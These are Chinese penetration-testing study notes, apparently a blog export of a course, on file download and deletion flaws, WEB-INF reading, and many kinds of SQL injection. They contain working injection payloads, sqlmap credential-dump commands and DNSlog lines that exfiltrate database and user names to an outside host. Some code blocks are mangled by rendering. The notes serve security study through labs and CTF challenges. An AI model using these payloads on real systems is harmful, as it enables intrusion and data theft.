+<p>文件删除</p>
+<ul>
+<li>可能存在安全问题：<ul>
+<li>前台或后台有删除功能应用，必须网站有删除的功能，才有可能发生任意文件下载</li>
+</ul>
+</li>
+<li>利用：常规删除重装锁定配合程序重装或高危操作<ul>
+<li>一般是删除install/install_lock.txt ,删除后，再次访问install目录，就会提示重装网站，这是我们完全可以使网站连接我们自己的数据库，然后拿下服务器权限</li>
+</ul>
+</li>
+</ul>
+<p>黑盒：以上文件包含，下载，删除，读取等安全漏洞，</p>
+<ul>
+<li>基本都是通过观察参数名传输，来尝试修改的参数值测试是否存在这类安全问题</li>
+</ul>
+<p>#案例1-文件下载-某博客自定义文件下载</p>
+<ul>
+<li>疑问：如果下载的参数被加密了怎么办？<ul>
+<li>1、将参数解密，比如base解码</li>
+<li>2、构造需要下载的其他文件</li>
+<li>3、将构造的文件名进行base64编码</li>
+<li>4、将编码后的文件名拼接到参数那里进行尝试下载</li>
+<li><img src="/source/images/image-20210807170941944.png" alt="image-20210807170941944"></li>
+</ul>
+</li>
+</ul>
+<p>#案例2-文件读取-小米路由器任意文件读取</p>
+<ul>
+<li><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></li>
+</ul>
+<p>#案例3-文件删除-海洋影视后台任意文件删除</p>
+<ul>
+<li>后台任意文件删除配合重装-<a href="https://xz.aliyun.com/t/3805">https://xz.aliyun.com/t/3805</a></li>
+</ul>
+<p>#案例4-CTF赛题-[RoarCTF 2019]EasyJava复现</p>
+<ul>
+<li><p><a href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java">https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java</a></p>
+</li>
+<li><p>必备知识点：java的敏感目录是WEB-INF，所以碰到文件读取或下载，我们可以尝试下载/WEB-INF/web.xml</p>
+</li>
+<li><p>WEB-INF主要包含一下文件或目录:</p>
+<ul>
+<li>/WEB-INF/web.xml：<ul>
+<li>Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则，里面有很多文件都是用点 ‘.’  来进行连接的，点 ‘.’  类似于目录的斜杠 /  </li>
+</ul>
+</li>
+<li>/WEB-INF/classes/：<ul>
+<li>含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中，需要结合web.xml里获取到的源代码文件，将里面的点 ‘.’ 换成斜杠 /  然后拼接到/WEB-INF/classes/ 后面，后缀是class，然后通过文件下载或读取获取内容，获取到内容，然后适用IDEA里即可自动进行反编译<ul>
+<li><img src="/source/images/image-20210807170305564.png" alt="image-20210807170305564"></li>
+<li><img src="/source/images/image-20210807170355415.png" alt="image-20210807170355415"></li>
+<li><img src="/source/images/image-20210807170515806.png" alt="image-20210807170515806"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>/WEB-INF/lib/：<ul>
+<li>存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
+</ul>
+</li>
+<li>/WEB-INF/src/：<ul>
+<li>源码目录，按照包名结构放置各个java文件。</li>
+</ul>
+</li>
+<li>/WEB-INF/database.properties：<ul>
+<li>数据库配置文件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>漏洞检测以及利用方法：</p>
+<ul>
+<li>下载漏洞-配置文件-获取文件架构-下载后反编译源码</li>
+<li>通过找到web.xml文件，推断class文件的路径，</li>
+<li>最后直接class文件，在通过反编译class文件，得到网站源码获取flag</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>16-20、渗透测试(xiaodi)</title>
+    <url>/2021/08/10/15-20%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
+    <content><![CDATA[<p>16、XFF&amp;HTTP头&amp;Post&amp;Cookie注入</p>
+<p>案例1-原理分析-测试代码段解释</p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例1-原理分析-测试代码段解释</span><br><span class="line">https://www.cnblogs.com/zhao-/p/10994615.html</span><br><span class="line">https://www.w3school.com.cn/php/php_superglobals.asp</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html; charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line">$get=$_GET[&#x27;g&#x27;];</span><br><span class="line">$post=$_POST[&#x27;p&#x27;];</span><br><span class="line">$cookie=$_COOKIE[&#x27;c&#x27;];</span><br><span class="line">$request=$_REQUEST[&#x27;r&#x27;];        #既接收get请求，也接收post请求</span><br><span class="line">$host=$_SERVER[&#x27;HTTP_HOST&#x27;];       #接收请求头里的host</span><br><span class="line">$user_agent=$_SERVER[&quot;HTTP_USER_AGENT&quot;];       #接收请求头里的浏览器agent</span><br><span class="line">$ip=$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];          #接收请求头里的ip来源</span><br><span class="line">#以下是显示每个变量</span><br><span class="line">echo $get.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $post.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $cookie.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $request.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $host.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $user_agent.&quot;&lt;hr&gt;&quot;;</span><br><span class="line">echo $ip;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#案例2-应用场景-提交方式&amp;接受信息</span><br><span class="line">场景1：常见登录数据请求方法</span><br><span class="line">	① 登录框注入</span><br><span class="line">	② 万能密码</span><br><span class="line">场景2：常见访问者来源IP判断</span><br><span class="line">	X-Forwarded-For: </span><br><span class="line">场景3：常见访问者浏览器信息判断</span><br><span class="line">https://www.cnblogs.com/lushaoyan/p/11088213.html</span><br><span class="line"></span><br><span class="line">#案例3-SQL注入-POST注入&amp;SQLMAP</span><br><span class="line">#注意事项：再使用万能密码的时候，一定要带上正确的账号，比如admin，因为通过组合，语句就是 admin&#x27; or &#x27;1&#x27; =&#x27;1  &#x27; and passwd = &#x27;password&#x27;</span><br><span class="line">		根据优先级的不同，and优先级高于or，所以会先对  &#x27;1&#x27; =&#x27;1  &#x27; and passwd = &#x27;password&#x27;   进行判断，因为密码必定是错的，所以这个语句整个都是假，接着就是  admin&#x27; or 假     因为admin是我们发现的已经存在的账号，所以  真 or 假 = 真   ，最终成功登录</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">#使用sqlmap读取数据包来进行post注入</span><br><span class="line">python sqlmap.py -r post.txt --current-db</span><br><span class="line">python sqlmap.py -r post.txt --tables -D &quot;purchase&quot; </span><br><span class="line">python sqlmap.py -r post.txt --columns -T &quot;admin&quot; -D &quot;purchase&quot;</span><br><span class="line">python sqlmap.py -r post.txt --dump -C &quot;username,password,thekey&quot; -T &quot;admin&quot; -D &quot;purchase&quot;</span><br><span class="line"></span><br><span class="line">#案例4-SQL注入-HTTP头注入&amp;SQLMAP</span><br><span class="line">#对host的位置进行注入</span><br><span class="line">#注意：host原来的数据千万不能删除，我们sql注入只需要再原来的host后面进行拼接即可</span><br><span class="line">order by 4</span><br><span class="line">union select 1,flag,3,4 from flag</span><br><span class="line"></span><br><span class="line">#案例5-SQL注入-XFF头IP注入&amp;SQLMAP</span><br><span class="line">#在  X-Forwarded-For:     位置进行注入</span><br><span class="line">python sqlmap.py -r xff.txt --current-db</span><br><span class="line">python sqlmap.py -r xff.txt --tables -D &quot;webcalendar&quot;</span><br><span class="line">python sqlmap.py -r xff.txt --columns -T user -D &quot;webcalendar&quot;</span><br><span class="line">python sqlmap.py -r xff.txt --dump -C &quot;username,password&quot; -T user -D &quot;webcalendar&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="17、SQL注入-amp-Json-amp-Base64-amp-格式类型"><a href="#17、SQL注入-amp-Json-amp-Base64-amp-格式类型" class="headerlink" title="17、SQL注入&amp;Json&amp;Base64&amp;格式类型"></a>17、SQL注入&amp;Json&amp;Base64&amp;格式类型</h2><p>#案例1-参数格式-数字&amp;字符&amp;JSON等注入测试</p>
+<ul>
+<li>```python<br>一、字符型与数字型#技巧：字符型必须要考虑闭合单引号，以及注释掉后面的单引号，常用注释符有 –+    #  – (1)借用Sqlilabs-Less1&amp;2讲解，本地及应用场景’ union select 1,2,3–+union select 1,2,3##搜索框注入原理：我们在搜索的时候，有时候搜索 1 ，一般内容胡总和标题里有 1 的都会显示出来，因为他是用通配符 % 来进行匹配的，同时，搜索框一般既能搜索数字型，也可以搜索字符型，所以在查询语句中，一般都会将变量用单引号引起来，依据该原理，正常的搜索处的语句是：select * from zzz_user where name like ‘%$name%’#注入方法：所以如果搜索功能存在注入点，我们注入的时候就需要考虑单引号和通配符的闭合二、json型格式的注入#应用场景：很多时候，网站post的数据并不是 a=1&amp;b=3  结构的，有的是json格式的：{“username”:”admin”}#基本原理，网站获取到json格式，然后用json_decode 对json进行提取，比如这里就是提取到的数据就是 admin  ，因为admin是字符型，所以在组合到数据库查询语句里会将其用单引号引起来，比如   $sql = “SELECT * FROM users WHERE username = ‘{$username}’”;    所以，当我们注入的时候，只需要在键 username所对应的值 admin后面拼接sql语句即可，但是必须要首先闭合前面的单引号，然后注释掉后面的不要的句子本地模拟登陆数据传输&amp;某WEB赛题数据数据{“username”:”admin’ order by 3#”}     #当order by 4，页面异常，所以长度为3{“username”:”-admin’ union select 1,2,3#”}#易错点:    1、这里的注释，必须要用井号’ # ‘来注释    2、必须要将unino前面的语句置错，所以在admin前面加上负号  - <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">\#案例2-数据处理-编码BASE64&amp;加密MD5等注入测试</span><br><span class="line"></span><br><span class="line">- 技巧：先解密，然后组合payload，接着再加密，进行访问</span><br><span class="line">  - MD5-借用某案例进行说明利用-原理</span><br><span class="line">  - BASE64-借用某案例进行复现测试-原理     </span><br><span class="line"></span><br><span class="line">\#案例3-SQL操作-查询&amp;插入&amp;更新&amp;删除&amp;堆叠等测试</span><br><span class="line"></span><br><span class="line">学习目的：不同的数据库操作对应不同的注入方式，比如数据库查询操作，一般都是用select，因为它有回显，所以一般采用联合注入；但是数据库的插入、更新、删除等等，是没有回显的，所以它就只能盲注了</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  select-查询-应用场景分析-SQL查询演示select * from zhibo_test.m_sms where id=1;#这里的zhibo_test.m_sms 表示数据库zhibo_test下的表m_smsinsert-插入-应用场景分析-SQL插入演示insert into zhibo_test.m_sms values(&#x27;66&#x27;,&#x27;register&#x27;,&#x27;13345677654&#x27;,&#x27;1234&#x27;,&#x27;0&#x27;,&#x27;11.11.1.1&#x27;,&#x27;15345333321&#x27;);update-更新-应用场景分析-SQL更新演示update zhibo_test.m_sms set username=&#x27;xiaodi&#x27; where id=27;delete-删除-应用场景分析-SQL删除演示delete from m_sms where id=28;堆叠测试-执行-应用场景分析-SQL多条演示select * from m_sms;delete from m_sms where id=66;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="18、SQL查询方式-amp-布尔-amp-延时-amp-报错盲注"><a href="#18、SQL查询方式-amp-布尔-amp-延时-amp-报错盲注" class="headerlink" title="18、SQL查询方式&amp;布尔&amp;延时&amp;报错盲注"></a>18、SQL查询方式&amp;布尔&amp;延时&amp;报错盲注</h2><p>SQL注入盲注</p>
+<ul>
+<li>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：<ul>
+<li>基于布尔的SQL盲注-逻辑判断<ul>
+<li>regexp,like,ascii,left,ord,mid</li>
+</ul>
+</li>
+<li>基于时间的SQL盲注-延时判断<ul>
+<li>if,sleep</li>
+</ul>
+</li>
+<li>基于报错的SQL盲注-报错回显<ul>
+<li>floor，updatexml，extractvalue</li>
+<li>参考链接<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>什么时候该用盲注？什么时候该用联合注入？</p>
+<ul>
+<li>在无法爆出显示位的时候就要用盲注了</li>
+<li>注册、更新信息、删除信息、发表新内容等地方只有一个提示成功的字眼，所以这里也是盲注，一般常用布尔盲注和报错的盲注</li>
+</ul>
+<p>联合注入和盲注的易错点：</p>
+<ul>
+<li><strong>联合注入需要将union前面的语句置错，但是盲注却不需要，因为他是用and拼接的，所以肯定不能置错的</strong></li>
+</ul>
+<p>盲注语法基础：</p>
+<p>多个语句的意义：有时候我们一个字母一个字母爆破名字的时候，可能网站会过滤单引号，那么ord和ascii的语法就可以派上用场了</p>
+<ul>
+<li>like ‘ro%’            #判断ro或ro…是否成立，如果没有通配符%,那么 like ‘admin’  就是精准匹配，只匹配值等于admin的</li>
+<li>regexp ‘^xiaodi[a-z]’ #匹配xiaodi及xiaodi…等，模糊匹配，regexp ‘admin’ 只要包含admin的就显示，比如admin1 admin2</li>
+<li>if(条件,5,0)           #条件成立 返回5 反之 返回0</li>
+<li>sleep(5)              #SQL语句延时执行5秒</li>
+<li>mid和substr：用法一样<ul>
+<li>mid(a,b,c)            #从位置b开始，截取a字符串的c位</li>
+<li>substr(a,b,c)         #从位置b开始，截取字符串a的c长度</li>
+</ul>
+</li>
+<li>left(database(),1)，database() #left(a,b)从左侧截取a的前b位</li>
+<li>length(database())=8  #判断数据库database()名的长度</li>
+<li>ord和ascii：用法一样 </li>
+<li>ascii(x)=97 #判断x的ascii码是否等于97</li>
+</ul>
+<p>SQL查询方式注入</p>
+<ul>
+<li>语法：<ul>
+<li>select,insert,update,delete,orderby等</li>
+</ul>
+</li>
+<li>注入出现位置：<ul>
+<li>正常url界面</li>
+<li>用户注册、发表新内容等位置</li>
+<li>修改内容、删除内容等功能</li>
+</ul>
+</li>
+</ul>
+<h3 id="盲注基本知识"><a href="#盲注基本知识" class="headerlink" title="盲注基本知识"></a>盲注基本知识</h3><p>基本语法：</p>
+<p>select * from member where username like ‘vi%’;</p>
+<p>select * from member where username regexp ‘^x’;</p>
+<ul>
+<li>匹配除了x的其他字符， 符号  ^   代表 除了 … </li>
+</ul>
+<p>select * from member where id=1 and sleep(1);</p>
+<ul>
+<li>查询成功后，并且延迟1秒</li>
+</ul>
+<p>select * from member where id=1 and if(1&gt;2,sleep(1),0);</p>
+<ul>
+<li>首先查询，接着进行判断，如果1&gt;2 ，就延迟1秒，否则立刻显示</li>
+</ul>
+<p>select * from member where id=1 and if(1&lt;2,sleep(1),0);</p>
+<p>select * from member where id=1 and length(database())=7;</p>
+<ul>
+<li>判断当前数据库的名字的长度是否等于7，如果是，则查询结果正常显示，否则不显示</li>
+</ul>
+<p>select * from member where id=1 and left(database(),1)=’p’;</p>
+<ul>
+<li>判断当前数据库的名字的从左到右的第一个字符是不是 p ，如果是，则查询结果正常显示，否则不显示</li>
+</ul>
+<p>select * from member where id=1 and left(database(),2)=’pi’;</p>
+<ul>
+<li>判断当前数据库的名字的从左到右的前2个字符是不是 pi ，如果是，则查询结果正常显示，否则不显示</li>
+</ul>
+<p>select * from member where id=1 and substr(database(),1,1)=’p’;</p>
+<ul>
+<li>截取当前数据库的名字，从第1位开始，截取1位，比如sec，截取的结果就是s，这里截取后判断其是否等于 p ，如果是，则页面正常显示</li>
+</ul>
+<p>select * from member where id=1 and substr(database(),2,1)=’i’;</p>
+<ul>
+<li>截取当前数据库的名字，从第2位开始，截取1位，比如sec，截取的结果就是e，这里截取后判断其是否等于 i ，如果是，则页面正常显示</li>
+</ul>
+<p>select * from member where id=1 and ord(left(database(),1))=112;</p>
+<ul>
+<li>判断当前数据库的名字从左到右的第1位的字符转换为ascii码后是不是等于112，如果是，则页面返回正常</li>
+</ul>
+<p>#案例1-Pikachu-查询注入测试（报错盲注)</p>
+<p>Pikachu insert</p>
+<ul>
+<li><p>技巧：直接套用即可，在用户注册，新增内容的位置都可以尝试</p>
+</li>
+<li><p>易错点：就算我们是在手机号的位置进行注入，但是我们也要完全套用这个模板，不需要去掉单引号</p>
+</li>
+<li><p>```php<br>username=x’ or(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit username=x’ or updatexml(1,concat(0x7e,(version())),0) or ‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit    username=x’ or extractvalue(1,concat(0x7e,database())) or ‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20210731124312971](/source/images/image-20210731124312971.png)</span><br><span class="line"></span><br><span class="line">- ![image-20210731125026616](/source/images/image-20210731125026616.png)</span><br><span class="line"></span><br><span class="line">Pikachu update</span><br><span class="line"></span><br><span class="line">- 直接套用，适用于修改内容处</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky&#x27; or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or &#x27;&amp;email=wuhan&amp;submit=submit    sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky&#x27; or  updatexml(1,concat(0x7e,(version())),0) or &#x27;&amp;email=wuhan&amp;submit=submit    sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=Nicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;&amp;email=wuhan&amp;submit=submit</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Pikachu delete</p>
+<ul>
+<li><p>直接套用，适用于删除内容的位置</p>
+</li>
+<li><p>易错点：下面的三个payload与原有的语句的连接是用+号，比如下面的59和or之间就是用 + 号进行连接</p>
+<ul>
+<li>127.0.0.1/pikachu-master/vul/sqli/sqli_del.php?id=59+or+updatexml+<br>(1,concat(0x7e,user()),0)</li>
+</ul>
+</li>
+<li><p>```php<br>+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)    +or+updatexml+(1,concat(0x7e,database()),0)    +or+extractvalue(1,concat(0x7e,database()))</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20210731130124225](/source/images/image-20210731130124225.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#案例2-Sqlilabs-less5注入测试（布尔盲注）</span><br><span class="line"></span><br><span class="line">- 特点：显示位出不来</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  &#x27;and left(version(),1)=5#&#x27;and length(database())=8#    &#x27;and left(database(),1)&gt;&#x27;a&#x27;--+&#x27;and left(database(),2)&gt;&#x27;sa&#x27;--+</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>#案例3-Sqlilabs-less2注入测试（延时盲注）</p>
+<ul>
+<li>and if(ascii(substr(database(),1,1))=115,sleep(5),1)–+</li>
+<li>and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)–+</li>
+</ul>
+<p>#案例4-Sqlilabs-less46注入测试（排序盲注）</p>
+<p>参考注入天书</p>
+<p>#案例5-引出实战-某CMS黑盒测试SQL查询注入</p>
+<ul>
+<li>黑盒测试发布修改(insert,update)盲注测试<ul>
+<li>‘ and left(database(),1)&gt;’z’ or ‘ 返回0</li>
+<li>‘ and left(database(),1)=’z’ or ‘ 返回1</li>
+<li>‘ and left(database(),2)=’zz’ or ‘ 返回1</li>
+<li>‘ and left(database(),5)=’zzcms’ or ‘ 返回1</li>
+<li><img src="/source/images/image-20210731131731783.png" alt="image-20210731131731783"></li>
+<li><img src="/source/images/image-20210731131749308.png" alt="image-20210731131749308"></li>
+<li><img src="/source/images/image-20210731131838109.png" alt="image-20210731131838109"></li>
+<li><img src="/source/images/image-20210731132003828.png" alt="image-20210731132003828"></li>
+</ul>
+</li>
+</ul>
+<h2 id="19、Dnslog-amp-堆叠-amp-二次-amp-高权限注入"><a href="#19、Dnslog-amp-堆叠-amp-二次-amp-高权限注入" class="headerlink" title="19、Dnslog&amp;堆叠&amp;二次&amp;高权限注入"></a>19、Dnslog&amp;堆叠&amp;二次&amp;高权限注入</h2><p>#案例1-堆叠注入-BUUCTF-[强网杯 2019]随便注</p>
+<p>适用场景：在网站禁掉了select、where等关键字后，可以尝试看存不存在堆叠注入</p>
+<p>检测堆叠注入：</p>
+<ul>
+<li><p>如果是数字型，直接在后面加上分号 ; 看页面是否正常，不正常则代表不存在堆叠注入</p>
+</li>
+<li><p>如果是字符型，在闭合单引号的情况下，然后加上分号 ; 如果页面正常，则存在堆叠注入</p>
+</li>
+<li><p>```python<br>解题方法一：堆叠注入：根据数据库类型决定是否支持多条语句执行’;show databases;’;show tables;’;show columns from <code>1919810931114514</code>;’;select flag from <code>1919810931114514</code>;     #这是错误写法，因为select被过滤了#下面语句中的 0x73656c656374202a2066726f6d20603139313938313039333131313435313460 是注入语句：select * from <code>1919810931114514</code>  转换成16进制的，这里因为表  1919810931114514 是纯数字，所以必须要用 <code>  </code>   这两个符号基本原理：首先将注入语句转成16进制（数据库支持16进制），接着将数据赋值给局部变量a(@代表局部声明变量)，接着再次预编译 局部变量a，将其放在 execsql里，最后执行execsql’;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;解题方法二参考连接：<a href="https://www.cnblogs.com/peri0d/p/12123814.html%E5%8E%9F%E7%90%86%EF%BC%9A%E4%B8%80%E5%85%B12%E4%B8%AA%E8%A1%A8%EF%BC%8C%E4%B8%80%E4%B8%AA%E8%A1%A8%E6%98%AFflag%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%98%AFwords%EF%BC%8C%E6%89%80%E4%BB%A5%E9%BB%98%E8%AE%A4%E7%9A%84%E8%A1%A8%E4%B8%80%E5%AE%9A%E6%98%AFwords%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AA%E9%9C%80%E8%A6%81%E5%B0%86%E5%8E%9F%E6%9D%A5%E7%9A%84flag%E8%A1%A8%E6%94%B9%E4%B8%BAwords%E5%8D%B3%E5%8F%AF%E3%80%82%E9%A6%96%E5%85%88%E5%B0%86words%E9%9A%8F%E4%BE%BF%E6%94%B9%E4%B8%AA%E5%90%8D%E5%AD%97%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86flag%E9%87%8D%E5%91%BD%E5%90%8D%E4%B8%BAwords%EF%BC%8C%E6%89%80%E4%BB%A5%E6%96%B0%E7%9A%84words%E8%A1%A8%E9%87%8C%E5%92%8C%E5%8E%9F%E6%9D%A5%E7%9A%84flag%E9%87%8C%E5%82%A8%E5%AD%98%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84%EF%BC%8C%E6%88%91%E4%BB%AC%E6%8E%A5%E7%9D%80%E9%80%9A%E8%BF%87%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96flag/?inject=1&#39;;RENAME">https://www.cnblogs.com/peri0d/p/12123814.html原理：一共2个表，一个表是flag，一个是words，所以默认的表一定是words，我们只需要将原来的flag表改为words即可。首先将words随便改个名字，然后将flag重命名为words，所以新的words表里和原来的flag里储存的数据是一样的，我们接着通过另一个查询语句，即可成功获取flag/?inject=1&#39;;RENAME</a> TABLE <code>words</code> TO <code>words1</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23查询flag：   /?inject=1’ or ‘1’=’1   </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例2-二次注入-BUUCTF-[RCTF2015]EasySQL</span><br><span class="line"></span><br><span class="line">- 应用场景：留言、评论、新用户注册的昵称</span><br><span class="line"></span><br><span class="line">  - 网站对用户存储的语句仅仅通过对部分字符进行转义来防止sql注入，接着又将该语句存储到数据库中了（比如留言，新注册的用户的昵称），为了用户存储和显示的内容一致，所以就将转义前的语句存储起来了，这样既保持了用户数据的一致性，也杜绝了sql注入，但是却可以产生二次注入</span><br><span class="line"></span><br><span class="line">- 利用方法：</span><br><span class="line"></span><br><span class="line">  - 首先判断当前位置过滤了啥，比如我们在用户名处插入payload，很大几率失败(用户名格式不正确)，所以我们需要通过fuzz搞清楚它到底过滤了什么关键字或者字符</span><br><span class="line">    - 注册账户抓包，然后将用户名那里设置变量，加载fuzz字典，接着观察看哪些字符可以使用</span><br><span class="line">      - 易错点：记得把空格加进去，有很多地方过滤了空格</span><br><span class="line">  - 其次需要写入sql语句，存储到网站</span><br><span class="line">  - 最后调用之前写入的内容</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  功能点：注册（昵称构造payload）-登录-修改（就会触发数据库对该用户和其相关信息的匹配，从而导致二次注入）（insert-select-update）确定注入点-构造Payload-确定过滤-重新构造Payload#构造初始payload，发现错误，提示用户名不合法x&quot; or updatexml(1,concat(0x7e,(version())),0)##下面这个语句就可以创建用户成功，因为通过fuzz发现过滤的是空格，但是删除空格，or就和sql语句连在一起了，所以我们完全可以用字符  ^  来代替  or   效果是一致的，却绕过了空格过滤x&quot;^updatexml(1,concat(0x7e,(version())),0)##注册成功就开始登录#易错点：登录的账号要注意，我们的账号是包含payload的，比如这里的账号就是 x&quot;^updatexml(1,concat(0x7e,(version())),0)#   #接下来点击我们的用户名----点击修改密码来触发数据库对当前用户名的比对，因为我们的用户名后面又注释符 # ，而正常的更新密码的语句一般为：update user set new_passwd=&#x27;新密码&#x27; where username = &#x27;用户名&#x27; and old_passwd = &#x27;旧密码&#x27;     ，所以我们的旧密码完全可以随便输入，因为注释符的存在，所以旧密码无论是啥都没关系案例截图：详见当前代码框下面的截图#下面的代码为获取详细的flag的注入语句test&quot;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#test&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1)#test&quot;^updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag))),1)#test&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))),1)#test&quot;^updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1)#test&quot;^updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1)##得到flag的一部分：flag&#123;94ed4b89-f8b7-4997-8df4-e4    这是因为长度限制了，所以需要逆向的再获取flagtest&quot;^updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1)##1、得到逆向代码：       &#125;e70e54e0414e-4fd8-7994-7b8f-98接着将得到的逆向的flag进行反转，使用如下代码：    a = &#x27;:&#125;e70e54e0414e-4fd8-7994-7b8f-98&#x27;    a = a[::-1]    print(a)   #结果为：    89-f8b7-4997-8df4-e4140e45e07e&#125;:       #2、和正向的进行拼接 发现2部分falg在4997-e4这里都是重复的，所以只需要不全e4后面的代码   140e45e07e&#125; 即可flag&#123;94ed4b89-f8b7-4997-8df4-e4140e45e07e&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="/source/images/image-20210731210448334.png" alt="image-20210731210448334"></li>
+<li><img src="/source/images/image-20210731210503368.png" alt="image-20210731210503368"></li>
+<li><img src="/source/images/image-20210731210514495.png" alt="image-20210731210514495"></li>
+</ul>
+</li>
+</ul>
+<p>#案例3-Dnslog注入-本地Sqlilabs注入&amp;命令执行等</p>
+<ul>
+<li><p>特性：比较鸡肋，需要满足多个条件</p>
+<ul>
+<li>windows</li>
+<li>存在注入点</li>
+<li>需要支持load_file()函数</li>
+<li>需要secure_file_priv 需要为空：需要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可<ul>
+<li><img src="/source/images/image-20210801165434310.png" alt="image-20210801165434310"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>```python<br>应用场景：解决不回显，反向连接，SQL注入，命令执行，SSRF等ping test.dbuh8a.ceye.ioping %USERNAME%.dbuh8a.ceye.ioselect load_file(‘\\xxxx.dbuh8a.ceye.io\aa’));select load_file(concat(‘\\‘,(select database()),’.dbuh8a.ceye.io\aa’));</p>
